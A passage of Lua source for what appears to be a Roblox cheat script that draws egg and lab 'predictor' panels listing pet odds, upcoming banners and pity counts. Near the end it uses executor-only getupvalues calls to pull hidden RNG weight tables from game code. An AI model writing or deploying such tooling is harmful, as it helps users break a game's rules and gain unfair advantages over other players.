		local n37 = math.min(tbl32.ActionUnits or 5, n36 * 0.45)
		local n38 = math.max(1, n36 - n37 - n34)
		tbl32.Action.Set({ X = n15 - n37, Y = 0.05, Width = n37, Height = n27 - 0.1 })
		local v16 = fn29(tbl32.Rarity)

		if v16 then
			n22 = v16 + 0.1
		else
			flag2 = true
		end

		local v17 = fn29(tbl32.Name)

		if v17 then
			n21 = math.min(v17 + 0.1, math.max(1, n38 - n22 - n34))
		else
			flag2 = true
		end

		tbl32.Name.Set({ X = n26, Y = 0, Width = n21, Height = n27 })

		tbl32.Rarity.Set({
			X = n26 + n21 + n34,
			Y = 0,
			Width = math.max(0.5, math.min(n22, n38 - n21 - n34)),
			Height = n27,
		})

		tbl32.Info.Set({ X = n26, Y = n27, Width = n36, Height = math.max(1, n25 - n27) })
		local n39 = math.max(1, n15 - n33 - n31 * 2)
		local n40 = 0

		for _, v18 in ipairs(tbl35) do
			if v18.Kind == "text" then
				local handle = v18.Handle
				local v19 = fn30(handle, n15)

				if v19 then
					v18.Height = v19
				else
					flag2 = true
				end

				local n41 = math.max(1, v18.Height or 1)
				handle.Set({ X = 0, Y = n40 + (v18.Gap and 0.5 or 0), Width = n15, Height = n41 })
				n40 += n41 + n35 * 0.5 + (v18.Gap and 0.5 or 0)
			else
				local item = v18.Item
				local v19 = fn30(item.Detail, n39)

				if v19 then
					item.DetailUnits = v19
				else
					flag2 = true
				end

				local n41 = math.clamp(item.DetailUnits or 1, 1, 4)
				local v20 = fn29(item.Status)

				if v20 then
					item.StatusUnits = v20 + 0.23
				else
					flag2 = true
				end

				local n42 = math.min(n39 * 0.42, math.max(2.73, item.StatusUnits or 2.73))
				local n43 = math.max(1, n39 - n42 - n34)
				local v21 = fn29(item.Rarity)

				if v21 then
					item.RarityUnits = v21 + 0.1
				else
					flag2 = true
				end

				local n44 = math.min(item.RarityUnits or 3, n43 * 0.5)
				local v22 = fn29(item.Name)

				if v22 then
					item.NameUnits = v22 + 0.1
				else
					flag2 = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = item.NameUnits or 4
				local max2 = math.max
				local n45 = n43 - n44 - n34
				local v23 = min(max(1, nameUnits), max2(1, n45))
				local n46 = n32 * 2
				local n47 = math.max(n41 + n27, 2.3) + n46
				local n48 = (n47 - n41 - n27) / 2
				item.Frame.Set({ X = 0, Y = n40, Width = n15, Height = n47 })
				item.Icon.Set({ Y = (n47 - n30) / 2 })
				item.Name.Set({ X = n31 + n33, Y = n48, Width = v23 })
				item.Rarity.Set({ X = n31 + n33 + v23 + n34, Y = n48, Width = math.max(0.5, n44) })
				item.Detail.Set({ X = n31 + n33, Y = n48 + n27, Width = n39, Height = n41 })

				item.Status.Set({
					Visible = v18.HasStatus,
					X = n31 + n33 + n39 - n42,
					Y = n48,
					Width = math.max(0.5, n42),
				})

				n40 += n47 + n35
			end
		end

		local n41 = math.max(1, n40)

		if math.abs(n41 - n20) > 0.01 then
			n20 = n41
			v13:SetContentLines(n41)
		end
	end

	local function fn41()
		if not v13 then
			return
		end
		n23 = 2
		local v15 = fn21()
		table.clear(tbl35)
		local n36 = 0

		local function fn42(arg, arg2)
			n36 += 1
			local v16 = fn33(n36)
			v16.Set({ Visible = true, Text = arg })
			table.insert(tbl35, { Kind = "text", Handle = v16, Gap = arg2 })
		end

		local n37

		if not v15 then
			fn38(nil)
			fn42(bold2(paint2(color3.Hint, "Egg data is not available yet")), false)
			n37 = 0
		else
			fn22(v15)
			local v16, v17 = fn35(v15)
			fn42(v16, false)
			local v18 = nil

			if id ~= nil then
				v18 = nil

				for _, v19 in ipairs(v15) do
					if v19.Id == id then
						v18 = v19
						break
					else
						v18 = nil
					end
				end
			end

			fn38(v18 or v17)
			local v19 = string.lower(v13:Query())
			local tbl36 = {}

			for _, v20 in ipairs(v15) do
				if fn36(v20, v19) then
					table.insert(tbl36, v20)
				end
			end

			if #tbl36 == 0 then
				fn42(paint2(color3.Hint, #v15 == 0 and "No eggs yet" or string.format("No results for \"%s\"", tbl12.Escape(v19))), false)
				n37 = 0
			else
				n37 = 0

				for _, v20 in ipairs(tbl30) do
					local tbl37 = {}

					for _, v21 in ipairs(tbl36) do
						if v21.Status == v20.Key then
							table.insert(tbl37, v21)
						end
					end

					if #tbl37 > 0 then
						local flag5 = #tbl35 > 0
						fn42(string.format("<b><font color=\"%s\">%s</font></b> <font color=\"#AAAAAA\">(%d)</font>", v20.Color, v20.Title, #tbl37), flag5)

						for _, v21 in ipairs(tbl37) do
							n37 += 1
							local v22 = fn34(n37)
							fn39(v22, v21)
							table.insert(tbl35, { Kind = "item", Item = v22, HasStatus = true })
						end
					end
				end
			end
		end

		for i = n36 + 1, #tbl34 do
			tbl34[i].Set({ Visible = false })
		end

		for i = n37 + 1, #tbl33 do
			tbl33[i].Frame.Set({ Visible = false })
		end

		fn40()
		n23 = 2
	end

	tbl12.RequestEggRefresh = requestEggRefresh

	if not tbl12.Ready then
		v12:CreateText({ Name = "Egg Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		v12:CreateDropdown({
			Name = "Sort By",
			Options = tbl29,
			Default = tbl29[1],
			Callback = function(sort)
				if table.find(tbl29, sort) then
					tbl31.Sort = sort
					requestEggRefresh()
				end
			end,
		})

		v12:CreateToggle({
			Name = "Preview Card",
			Default = true,
			Callback = function(arg)
				tbl31.Spotlight = arg == true
				requestEggRefresh()
			end,
		})

		local v15 = v12:CreateCanvas({
			Name = "Egg Predictor",
			Search = true,
			SearchPlaceholder = "Search eggs...",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 32,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(arg)
				fn32(arg)
				requestEggRefresh()
			end,
		})

		fn4(function()
			v15:Destroy()
		end)

		local connection = RunService.Heartbeat:Connect(function(deltaTime)
			local v16 = tbl12.PageVisible()
			local flag5

			if v16 then
				flag5 = v13 == nil or tbl12.IsShown(v13:Root())
			else
				flag5 = v16
			end

			if flag5 and not flag4 then
				flag3 = true
			end

			flag4 = flag5
			if not v16 then
				return
			end
			n24 += deltaTime

			if flag5 and flag3 or n24 >= n13 then
				n24 = 0

				if flag5 then
					flag3 = false
					pcall(fn41)
				end

				if tbl12.RefreshFuse then
					pcall(tbl12.RefreshFuse)
				end
			end

			if flag5 and (n23 > 0 or flag2) then
				if n23 > 0 then
					n23 -= 1
				end

				pcall(fn40)
			end

			if tbl12.PlaceFuse then
				tbl12.PlaceFuse()
			end
		end)

		fn4(function()
			connection:Disconnect()
		end)
	end

	paint = tbl12.Paint
	bold = tbl12.Bold
	color = tbl12.Color
	local n36 = 5
	local n37 = n36 + 0.8
	local n38 = 1.2
	local n39 = 1.2
	local n40 = 0.936
	local n41 = 2.3
	local n42 = 0.25
	local n43 = 0.18
	local n44 = n41 + 0.6
	local n45 = 0.24
	n2 = 0.22
	local n46 = 0.0909
	v10 = nil
	tbl13 = {}
	tbl14 = {}
	tbl15 = {}
	tbl16 = {}
	local n47 = 0
	local n48 = 0
	local n49 = 0.06
	local n50 = -1
	local n51 = -1
	local n52 = -1
	local n53 = 4
	local n54 = 3
	flag = false
	n3 = 0

	fn8 = function(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl12.SecretGradient
		end
		return arg.Gradient
	end

	fn9 = function(arg)
		return fn8(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
	end

	fn10 = function(arg)
		if string.upper(tostring(arg.Rarity)) == "SECRET" then
			return tbl12.SecretRotation
		end
		return nil
	end

	fn11 = function(arg)
		v10 = arg
		arg:SetDock(5, { Gap = n2, DividerColor = Color3.fromRGB(170, 174, 184) })
		local v15 = arg:Dock()

		tbl13.Icon = arg:Image({
			Parent = v15,
			X = 0,
			Y = 0,
			Width = n36,
			Height = n36,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.26,
			StrokeThickness = n46,
			StrokeTransparency = 0,
			ZIndex = 8,
		})

		tbl13.Name = arg:Text({
			Parent = v15,
			X = n37,
			Y = 0,
			Height = n38,
			Scale = n39,
			Wrap = false,
			Gradient = tbl12.NameGradient,
			TextStrokeTransparency = 1,
			ZIndex = 9,
		})

		tbl13.Rarity = arg:Text({
			Parent = v15,
			X = n37,
			Y = 0,
			Height = n38,
			Scale = n40,
			Wrap = false,
			Font = tbl12.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			ZIndex = 9,
		})

		tbl13.Info = arg:Text({ Parent = v15, X = n37, Y = n38, Height = n36 - n38, Wrap = false, ZIndex = 9 })

		arg:OnResize(function(arg2, arg3, arg4)
			if arg3 == n50 and arg4 == n51 then
				return
			end
			n50 = arg3
			n51 = arg4
			n47 = arg3 / math.max(arg4, 1)
			n48 = arg4
			n3 = 2
			n49 = 0.9 / math.max(arg:TextSize(), 1)
			tbl13.Rarity.Set({ StrokeThickness = n49 })

			for _, v16 in ipairs(tbl14) do
				v16.Rarity.Set({ StrokeThickness = n49 })
			end
		end)
	end

	local function fn42(arg)
		local v15 = arg and arg.Get()
		if not v15 or n48 <= 0 then
			return nil
		end

		if v15.Text ~= tostring(arg.Spec.Text or "") then
			return nil
		end
		return v15
	end

	local function fn43(arg)
		local v15 = fn42(arg)
		if not v15 then
			return nil
		end
		local size = v15.Size
		local textWrapped = v15.TextWrapped
		v15.TextWrapped = false
		v15.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
		local x = v15.TextBounds.X
		v15.Size = size
		v15.TextWrapped = textWrapped
		if x <= 0 then
			return nil
		end
		return x / n48
	end

	local function fn44(arg, arg2)
		local v15 = fn42(arg)
		if not v15 then
			return nil
		end
		local size = v15.Size
		v15.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n48 + 0.5)), 100000)
		local y = v15.TextBounds.Y
		v15.Size = size
		if y <= 0 then
			return nil
		end
		return y / n48
	end

	fn12 = function(arg)
		local v15 = tbl15[arg]

		if not v15 then
			v15 = v10:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
			tbl15[arg] = v15
		end

		return v15
	end

	fn13 = function(arg)
		local v15 = tbl14[arg]
		if v15 then
			return v15
		end

		local tbl36 = {
			Frame = v10:Frame({
				Name = "Slot",
				Background = "#000000",
				BackgroundTransparency = 0.74,
				Corner = 0.35,
				X = 0,
				Y = 0,
				Width = 1,
				Height = 1,
				Visible = false,
			}),
		}

		tbl36.Icon = v10:Image({
			Parent = tbl36.Frame,
			X = n42,
			Y = 0,
			Width = n41,
			Height = n41,
			Corner = 0.35,
			Background = "#000000",
			BackgroundTransparency = 0.45,
			StrokeThickness = n46,
			StrokeTransparency = 0,
		})

		tbl36.Name = v10:Text({
			Parent = tbl36.Frame,
			X = n42 + n44,
			Y = 0,
			Width = 1,
			Height = n38,
			Scale = n39,
			Wrap = false,
			Gradient = tbl12.NameGradient,
			TextStrokeTransparency = 1,
		})

		tbl36.Rarity = v10:Text({
			Parent = tbl36.Frame,
			X = n42 + n44,
			Y = 0,
			Width = 1,
			Height = n38,
			Scale = n40,
			Wrap = false,
			Font = tbl12.RarityFont,
			TextStrokeTransparency = 1,
			StrokeTransparency = 0.08,
			StrokeThickness = n49,
		})

		tbl36.Detail = v10:Text({
			Parent = tbl36.Frame,
			X = n42 + n44,
			Y = n38,
			Width = math.max(1, n47 - n44 - n42 * 2),
			Height = 1,
			Wrap = true,
		})

		tbl36.Status = v10:Text({
			Parent = tbl36.Frame,
			X = 0,
			Y = 0,
			Width = 1,
			Height = n38,
			Wrap = false,
			Align = "Right",
			Color = color.Hint,
		})

		tbl14[arg] = tbl36
		return tbl36
	end

	fn14 = function()
		if n47 <= 0 then
			return
		end
		flag = false
		local n55 = math.max(1, n47 - n37)
		local v15 = fn43(tbl13.Rarity)

		if v15 then
			n54 = v15 + 0.1
		else
			flag = true
		end

		local v16 = fn43(tbl13.Name)

		if v16 then
			n53 = math.min(v16 + 0.1, math.max(1, n55 - n54 - n45))
		else
			flag = true
		end

		tbl13.Name.Set({ X = n37, Y = 0, Width = n53, Height = n38 })

		tbl13.Rarity.Set({
			X = n37 + n53 + n45,
			Y = 0,
			Width = math.max(0.5, math.min(n54, n55 - n53 - n45)),
			Height = n38,
		})

		tbl13.Info.Set({ X = n37, Y = n38, Width = n55, Height = math.max(1, n36 - n38) })
		local n56 = math.max(1, n47 - n44 - n42 * 2)
		local n57 = 0

		for _, v17 in ipairs(tbl16) do
			if v17.Kind == "text" then
				local handle = v17.Handle
				local v18 = fn44(handle, n47)

				if v18 then
					v17.Height = v18
				else
					flag = true
				end

				local n58 = math.max(1, v17.Height or 1)
				handle.Set({ X = 0, Y = n57 + (v17.Gap and 0.5 or 0), Width = n47, Height = n58 })
				n57 += n58 + n2 * 0.5 + (v17.Gap and 0.5 or 0)
			else
				local slot = v17.Slot
				local v18 = fn44(slot.Detail, n56)

				if v18 then
					slot.DetailUnits = v18
				else
					flag = true
				end

				local n58 = math.clamp(slot.DetailUnits or 1, 1, 4)
				local v19 = fn43(slot.Status)

				if v19 then
					slot.StatusUnits = v19 + 0.23
				else
					flag = true
				end

				local n59 = math.min(n56 * 0.42, math.max(2.73, slot.StatusUnits or 2.73))
				local n60 = math.max(1, n56 - n59 - n45)
				local v20 = fn43(slot.Rarity)

				if v20 then
					slot.RarityUnits = v20 + 0.1
				else
					flag = true
				end

				local n61 = math.min(slot.RarityUnits or 3, n60 * 0.5)
				local v21 = fn43(slot.Name)

				if v21 then
					slot.NameUnits = v21 + 0.1
				else
					flag = true
				end

				local min = math.min
				local max = math.max
				local nameUnits = slot.NameUnits or 4
				local max2 = math.max
				local n62 = n60 - n61 - n45
				local v22 = min(max(1, nameUnits), max2(1, n62))
				local n63 = n43 * 2
				local n64 = math.max(n58 + n38, 2.3) + n63
				local n65 = (n64 - n58 - n38) / 2
				slot.Frame.Set({ X = 0, Y = n57, Width = n47, Height = n64 })
				slot.Icon.Set({ Y = (n64 - n41) / 2 })
				slot.Name.Set({ X = n42 + n44, Y = n65, Width = v22 })
				slot.Rarity.Set({ X = n42 + n44 + v22 + n45, Y = n65, Width = math.max(0.5, n61) })
				slot.Detail.Set({ X = n42 + n44, Y = n65 + n38, Width = n56, Height = n58 })
				slot.Status.Set({ X = n42 + n44 + n56 - n59, Y = n65, Width = math.max(0.5, n59) })
				n57 += n64 + n2
			end
		end

		local n58 = math.max(1, n57)

		if math.abs(n58 - n52) > 0.01 then
			n52 = n58
			v10:SetContentLines(n58)
		end
	end
end

do
	local v11 = fn2(function()
		return ReplicatedStorage.Data.ScrambleTradeIn
	end)

	local n4 = 30
	local tbl17 = { Biohazard = "#9DFF4D", Experimental = "#5AD8FF", UnstableDNA = "#FF6BD5" }
	local v12 = nil
	local flag2 = false
	local n5 = 0
	local tbl18 = { Banner = {}, Odds = {}, Chance = {}, Clears = 0 }

	local function fn15(arg)
		return tbl17[tostring(arg)] or color.Text
	end

	local function fn16(arg, ...)
		if type(v11) ~= "table" or type(v11[arg]) ~= "function" then
			return nil
		end
		local ok, result = pcall(v11[arg], ...)
		if ok then
			return result
		end
		return nil
	end

	local function fn17(arg)
		return tostring(fn16("GetBannerDisplayName", arg) or arg)
	end

	local function fn18(arg)
		local v13 = tbl18.Banner[arg]

		if v13 == nil then
			local BannerIdForPeriod = fn16("BannerIdForPeriod", arg) or false
			tbl18.Banner[arg] = BannerIdForPeriod
			v13 = BannerIdForPeriod
		end

		return v13 or nil
	end

	local function fn19(arg)
		local v13, v14, v15 = ipairs(type(v11) == "table" and v11.Banners or {})
		local n6 = 0
		local n7 = 0

		for _, v16 in v13, v14, v15 do
			local n8 = tonumber(fn16("GetBannerWeight", v16.Id)) or 0
			n6 += n8

			if v16.Id == arg then
				n7 = n8
			end
		end

		return n6 > 0 and n7 / n6 * 100 or 0
	end

	local function fn20(arg)
		local v13 = tbl18.Chance[arg]

		if v13 == nil then
			v13 = fn19(arg)
			tbl18.Chance[arg] = v13
		end

		return v13
	end

	local function fn21(arg)
		local GetBanner = fn16("GetBanner", arg)
		local tbl19 = {}
		local v13 = ipairs
		local pets = type(GetBanner) == "table" and GetBanner.Pets or {}
		local n6 = 0

		for _, pet in v13(pets) do
			local n7 = tonumber(fn16("GetPetWeight", arg, pet.AssetId)) or 0

			if n7 > 0 then
				n6 += n7
				table.insert(tbl19, { AssetId = pet.AssetId, Weight = n7 })
			end
		end

		for _, v14 in ipairs(tbl19) do
			v14.Chance = n6 > 0 and v14.Weight / n6 * 100 or 0
		end

		table.sort(tbl19, function(arg2, arg3)
			return arg2.Chance > arg3.Chance
		end)

		return tbl19
	end

	local function fn22(arg)
		local v13 = tbl18.Odds[arg]

		if v13 == nil then
			v13 = fn21(arg)
			tbl18.Odds[arg] = v13
		end

		return v13
	end

	local function fn23(arg)
		local ok, result = pcall(os.date, "%I:%M %p", math.floor(arg))
		if not ok then
			return ""
		end
		return (string.gsub(tostring(result), "^0", ""))
	end

	local function fn24(arg)
		local n6 = math.max(0, math.floor(arg))
		local n7 = math.floor(n6 / 86400)
		local n8 = math.floor(n6 % 86400 / 3600)
		local n9 = math.floor(n6 % 3600 / 60)
		if n7 > 0 then
			return string.format("%dd %dh %02dm", n7, n8, n9)
		end
		return string.format("%dh %02dm", n8, n9)
	end

	local function fn25(arg)
		local income = arg >= 10 and color.Income or arg >= 1 and color.Clock or "#FF7A7A"
		local str = string.format(arg >= 1 and "%.1f%%" or "%.2f%%", arg)
		return bold(paint(income, str))
	end

	local function fn26(arg)
		if arg <= 0 then
			return ""
		end
		local n6 = 100 / arg
		return paint(color.Hint, n6 < 10 and string.format("1 in %.1f", n6) or string.format("1 in %d", math.floor(n6 + 0.5)))
	end

	local function fn27(arg)
		if next(tbl4.Lab.Banners) ~= nil and tbl4.Lab.Banners[tostring(arg)] then
			return tbl12.Separator() .. bold(paint(color.Ready, "Your pick"))
		end
		return ""
	end

	local function fn28()
		if flag2 or os.clock() < n5 then
			return
		end
		flag2 = true
		n5 = os.clock() + n4

		task.spawn(function()
			local rfScrambleTradeInAskState = networking:FindFirstChild("RF/ScrambleTradeIn/AskState")

			if rfScrambleTradeInAskState and rfScrambleTradeInAskState:IsA("RemoteFunction") then
				local ok, result = pcall(rfScrambleTradeInAskState.InvokeServer, rfScrambleTradeInAskState)

				if ok and type(result) == "table" then
					v12 = result
				end
			end

			flag2 = false
		end)
	end

	local function fn29(arg, arg2, arg3)
		local flag3 = arg ~= nil
		v10:SetDock(flag3 and 5 or 0, { Gap = n2 })
		tbl13.Icon.Set({ Visible = flag3 })
		tbl13.Name.Set({ Visible = flag3 })
		tbl13.Rarity.Set({ Visible = flag3 })
		tbl13.Info.Set({ Visible = flag3 })
		if not flag3 then
			return
		end
		local v13 = fn15(arg)
		local GetBannerEggIcon = fn16("GetBannerEggIcon", arg)

		tbl13.Icon.Set({
			Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
			Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
			StrokeColor = Color3.fromHex(v13),
		})

		tbl13.Name.Set({ Text = tbl12.Escape(fn17(arg)) })
		tbl13.Rarity.Set({ Text = "ACTIVE", Color = Color3.fromHex(color.Ready), Gradient = nil })
		local n6 = arg3 - arg2 % arg3
		local tbl19 = {}
		local str = bold(paint(color.Clock, "Ends in " .. tbl12.FormatClock(n6))) .. tbl12.Separator() .. paint(color.Text, fn23(arg2 + n6))
		local str2 = paint(color.Hint, "Banner chance ") .. fn25(fn20(arg))
		tbl19[1] = str
		tbl19[2] = str2
		local v14 = v12

		if type(v14) == "table" and v14.BannerId == arg then
			if v14.Unlocked == false then
				table.insert(tbl19, paint("#FF7A7A", "Locked on this account"))
			else
				table.insert(tbl19, paint(color.Hint, "Pity ") .. bold(paint(color.Text, string.format("%s/%s", tostring(v14.PityCount or 0), tostring(v14.PityThreshold or 0)))) .. tbl12.Separator() .. paint(color.Hint, "Free rerolls ") .. bold(paint(color.Text, tostring(v14.FreeRefreshesRemaining or 0))))
			end
		end

		tbl13.Info.Set({ Text = table.concat(tbl19, "\n") })
	end

	local function fn30()
		if not v10 then
			return
		end
		n3 = 2
		table.clear(tbl16)
		local n6 = 0
		local n7 = 0

		local function fn31(arg, arg2)
			n6 += 1
			local v13 = fn12(n6)
			v13.Set({ Visible = true, Text = arg })
			table.insert(tbl16, { Kind = "text", Handle = v13, Gap = arg2 })
		end

		local function fn32(arg, arg2)
			local flag3 = #tbl16 > 0
			fn31(string.format("<b><font color=\"%s\">%s</font></b>", arg2, arg), flag3)
		end

		local function fn33()
			n7 += 1
			local v13 = fn13(n7)
			v13.Frame.Set({ Visible = true })
			table.insert(tbl16, { Kind = "slot", Slot = v13 })
			return v13
		end

		local serverTimeNow = workspace:GetServerTimeNow()
		local n8 = tonumber(fn16("RotationSeconds")) or 3600
		local n9 = math.floor(serverTimeNow / n8)

		if tbl18.Clears <= os.clock() then
			tbl18.Clears = os.clock() + 60
			table.clear(tbl18.Banner)
			table.clear(tbl18.Odds)
			table.clear(tbl18.Chance)
		end

		local v13 = fn18(n9)

		if type(v11) ~= "table" or v13 == nil then
			fn29(nil)
			fn31(bold(paint(color.Hint, "Lab data is not available yet")), false)
		else
			fn29(v13, serverTimeNow, n8)
			local v14 = v12

			if type(v14) == "table" and v14.BannerId == v13 and type(v14.Requirements) == "table" and #v14.Requirements > 0 then
				fn32("CURRENT RECIPE", color.Text)
				local tbl19 = {}

				for _, requirement in ipairs(v14.Requirements) do
					local v15 = tbl12.AssetInfo(requirement)
					local insert = table.insert
					local v16 = table.pack(bold(paint(v15.Hex, tbl12.Escape(v15.Name))))
					insert(tbl19, table.unpack(v16, 1, v16.n))
				end

				fn31(table.concat(tbl19, tbl12.Separator()), false)
			end

			fn32("REWARD ODDS" .. tbl12.Separator() .. string.upper(fn17(v13)), fn15(v13))
			local v15 = fn22(v13)

			for i, v16 in ipairs(v15) do
				local v17 = tbl12.AssetInfo(v16.AssetId)
				local v18 = fn33()
				v18.Icon.Set({ Visible = v17.Icon ~= nil, Image = v17.Icon or "", StrokeColor = v17.Color })
				v18.Name.Set({ Text = tbl12.Escape(v17.Name) })

				v18.Rarity.Set({
					Text = string.upper(tostring(v17.Rarity)),
					Color = fn9(v17),
					Gradient = fn8(v17),
					GradientRotation = fn10(v17),
				})

				v18.Status.Set({ Text = fn25(v16.Chance) })
				local v19 = fn26(v16.Chance)

				if i == #v15 then
					v19 ..= tbl12.Separator() .. bold(paint(color.Clock, "Chase pet"))
				end

				v18.Detail.Set({ Text = v19 })
			end

			fn32("UPCOMING LAB BANNERS", color.Text)

			for i = 1, 8 do
				local v16 = fn18(n9 + i)
				local n10 = (n9 + i) * n8
				local v17 = fn33()
				local GetBannerEggIcon = fn16("GetBannerEggIcon", v16)
				local v18 = fn15(v16)

				v17.Icon.Set({
					Visible = type(GetBannerEggIcon) == "string" and GetBannerEggIcon ~= "",
					Image = type(GetBannerEggIcon) == "string" and GetBannerEggIcon or "",
					StrokeColor = Color3.fromHex(v18),
				})

				v17.Name.Set({ Text = tbl12.Escape(fn17(v16)) })
				v17.Rarity.Set({ Text = i == 1 and "NEXT" or "#" .. i, Color = Color3.fromHex(v18), Gradient = nil })
				v17.Status.Set({ Text = bold(paint(color.Clock, "in " .. fn24(n10 - serverTimeNow))) })
				local v19 = fn22(v16)
				local v20 = v19[#v19]
				local str = paint(color.Hint, "Starts ") .. paint(color.Text, fn23(n10)) .. fn27(v16)

				if v20 then
					local v21 = tbl12.AssetInfo(v20.AssetId)
					str ..= tbl12.Separator() .. paint(color.Hint, "Chase ") .. bold(paint(v21.Hex, tbl12.Escape(v21.Name))) .. " " .. fn25(v20.Chance)
				end

				v17.Detail.Set({ Text = str })
			end

			fn32("NEXT TIME EACH BANNER OPENS", color.Text)
			local v16 = ipairs
			local banners = v11.Banners or {}

			for _, banner in v16(banners) do
				local v17 = fn15(banner.Id)
				local v18 = table.pack(tbl12.Escape(fn17(banner.Id)))
				local v19 = paint
				v18.n = 2 + v18.n - 1
				table.move(v18, 1, v18.n, 2, v18)
				v18[1] = v17
				local v20 = bold(v19(table.unpack(v18, 1, v18.n)))
				local str

				if banner.Id == v13 then
					str = v20 .. tbl12.Separator() .. bold(paint(color.Ready, "Open now"))
				else
					local v21 = nil

					for i = 1, 2000 do
						local id = banner.Id

						if fn18(n9 + i) == id then
							v21 = i
							break
						else
							v21 = nil
						end
					end

					if v21 then
						local n10 = (n9 + v21) * n8
						str = v20 .. tbl12.Separator() .. bold(paint(color.Clock, "in " .. fn24(n10 - serverTimeNow))) .. tbl12.Separator() .. paint(color.Text, fn23(n10))
					else
						str = v20 .. tbl12.Separator() .. paint(color.Hint, "Not soon")
					end
				end

				fn31(str .. tbl12.Separator() .. paint(color.Hint, "chance ") .. fn25(fn20(banner.Id)) .. fn27(banner.Id), false)
			end
		end

		for i = n6 + 1, #tbl15 do
			tbl15[i].Set({ Visible = false })
		end

		for i = n7 + 1, #tbl14 do
			tbl14[i].Frame.Set({ Visible = false })
		end

		fn14()
		n3 = 2
	end

	if not tbl12.Ready then
		v8:CreateText({ Name = "Lab Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		local v13 = v8:CreateCanvas({
			Name = "Lab Predictor",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 34,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(arg)
				fn11(arg)
				pcall(fn30)
			end,
		})

		fn4(function()
			v13:Destroy()
		end)

		local n6 = 1

		local connection = RunService.Heartbeat:Connect(function(deltaTime)
			if not v10 or not tbl12.PageVisible() or not tbl12.IsShown(v10:Root()) then
				return
			end
			fn28()
			n6 += deltaTime

			if n6 >= 1 then
				n6 = 0
				pcall(fn30)
			end

			if n3 > 0 or flag then
				if n3 > 0 then
					n3 -= 1
				end

				pcall(fn14)
			end
		end)

		fn4(function()
			connection:Disconnect()
		end)
	end
end

local paint2, bold2, color2, n4, n5, n6, n7, n8, n9, n10
local n11, n12

do
	local tbl17 = {
		{ min = 0.85, max = 1.05, weight = 2000 },
		{ min = 1.45, max = 1.55, weight = 250 },
		{ min = 1.9, max = 2.1, weight = 125 },
		{ min = 2.85, max = 3.15, weight = 62.5 },
		{ min = 3.8, max = 4.2, weight = 31.25 },
		{ min = 0.3, max = 0.45, weight = 18 },
		{ min = 0.1, max = 0.2, weight = 5 },
		{ min = 5.8, max = 6.2, weight = 15.625 },
		{ min = 9.5, max = 12.5, weight = 3 },
		{ min = 12, max = 17, weight = 0.05 },
		{ min = 20, max = 35, weight = 0.0001 },
	}

	paint2 = tbl12.Paint
	bold2 = tbl12.Bold
	color2 = tbl12.Color
	n4 = 5
	n5 = n4 + 0.8
	n6 = 1.2
	n7 = 1.2
	n8 = 0.936
	n9 = 2.3
	n10 = 0.25
	n11 = 0.18
	local n13 = n9 + 0.6
	local n14 = 0.24
	n12 = 0.22
	local n15 = 0.0909
	local v11 = nil
	local tbl18 = {}
	local tbl19 = {}
	local tbl20 = {}
	local tbl21 = {}
	local n16 = 0
	local n17 = 0
	local n18 = 0.06
	local n19 = -1
	local n20 = -1
	local n21 = -1
	local n22 = 4
	local n23 = 3
	local flag2 = false
	local n24 = 0
	local v12 = nil

	local tbl22 = {
		{ Min = 0, Color = "#8F98A8" },
		{ Min = 0.3, Color = "#C6CDDA" },
		{ Min = 0.85, Color = "#FFFFFF" },
		{ Min = 1.45, Color = "#7CFF9E" },
		{ Min = 1.9, Color = "#4FE0FF" },
		{ Min = 2.85, Color = "#6FA0FF" },
		{ Min = 3.8, Color = "#C08BFF" },
		{ Min = 5.8, Color = "#FF9A3D" },
		{ Min = 9.5, Color = "#FF5C5C" },
		{ Min = 12, Color = "#FFD34D" },
		{ Min = 20, Color = "#FF4DE8" },
	}

	local function fn15(arg)
		local n25 = -math.huge
		local str = "#FFFFFF"

		for _, v13 in ipairs(tbl22) do
			if arg + 0.001 >= v13.Min and v13.Min > n25 then
				str = v13.Color
				n25 = v13.Min
			end
		end

		return str
	end

	local function fn16(arg, arg2)
		local eggRecords = tbl.EggRecords
		if type(eggRecords) ~= "table" or type(eggRecords.WeightKgForScale) ~= "function" then
			return nil
		end
		local ok, result = pcall(eggRecords.WeightKgForScale, arg, arg2)
		if ok and type(result) == "number" and result > 0 then
			return result
		end
		return nil
	end

	local function fn17(arg)
		if type(arg) ~= "table" or #arg == 0 then
			return nil
		end
		local n25 = -math.huge
		local v13 = nil

		for _, v14 in ipairs(arg) do
			local v15 = tbl12.MutationMultiplier({ v14 })

			if n25 < v15 then
				n25 = v15
				v13 = v14
			end
		end

		return v13
	end

	local function fn18()
		if v12 then
			return v12
		end
		local eggRecords = tbl.EggRecords
		local getupvalues_ = type(debug) == "table" and debug.getupvalues or getupvalues

		if type(eggRecords) == "table" and type(eggRecords.DrawAssetScale) == "function" and type(getupvalues_) == "function" then
			local ok, result = pcall(getupvalues_, eggRecords.DrawAssetScale)

			if ok and type(result) == "table" then
				for _, v13 in pairs(result) do
					if type(v13) == "table" and type(v13[1]) == "table" and v13[1].min and v13[1].weight then
						v12 = v13
						break
					end
				end
			end
		end

		v12 = v12 or tbl17
		return v12
	end

	local function fn19(arg, arg2, arg3)
		local fuseKernel = tbl.FuseKernel

		if type(fuseKernel) == "table" and type(fuseKernel.BandWeightBias) == "function" then
			local ok, result = pcall(fuseKernel.BandWeightBias, arg, arg2, arg3)
